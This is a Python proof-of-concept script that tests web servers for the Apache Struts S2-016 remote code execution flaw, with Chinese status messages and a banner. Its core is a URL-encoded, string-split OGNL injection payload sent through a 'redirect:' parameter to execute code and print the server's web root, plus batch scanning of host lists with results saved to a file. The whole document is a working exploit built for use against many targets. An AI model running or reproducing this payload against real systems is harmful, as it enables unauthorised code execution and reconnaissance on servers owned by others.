import argparse
import textwrap

import requests


def main(url):

    full_url = f"{url}""?redirect:%24{%23req%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27)%2C%23resp%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27)%2C%23resp.setCharacterEncoding(%27UTF-8%27)%2C%23ot%3D%23resp.getWriter%20()%2C%23ot.print(%27web%27)%2C%23ot.print(%27path%3A%27)%2C%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2F%27))%2C%23ot.flush()%2C%23ot.close()}"

    try:
        response = requests.get(full_url, allow_redirects=False, verify=False,
                                timeout=5)
    except Exception:
        print(f"[-]{url}访问超时")
        return
    if 'webpath' in response.text:
        print(f'[+]{url}存在S2-16远程命令执行漏洞')
        return url
    else:
        print(f'[-]{url}不存在S2-16远程命令执行漏洞')


if __name__ == '__main__':
    banner = """ 
      _________________              _____ .________                               
     /   _____/\_____  \            /  |  ||   ____/         ______   ____   ____  
     \_____  \  /  ____/   ______  /   |  ||____  \   ______ \____ \ /  _ \_/ ___\ 
     /        \/       \  /_____/ /    ^   /       \ /_____/ |  |_> >  <_> )  \___ 
    /_______  /\_______ \         \____   /______  /         |   __/ \____/ \___  >
            \/         \/              |__|      \/          |__|               \/ 
    """
    print(banner)
    parser = argparse.ArgumentParser(description='S2-16 rce poc',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            S2-16.py -u http://192.168.1.108 -f host.txt
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com:80")
    parser.add_argument("-f", "--file", dest="file", type=str, help="example: -f host.txt")
    parser.add_argument("-o", "--output", dest="output", type=str, help=" example: -o result.txt")
    args = parser.parse_args()
    if args.file:
        res_url = []
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = main(line.strip())
                if url:
                    res_url.append(url)
        with open("result1.txt", mode="w", encoding="u8") as f:
            for i in res_url:
                f.write(f"{i}存在S2-16远程命令执行漏洞\n")
    else:
        main(args.url)
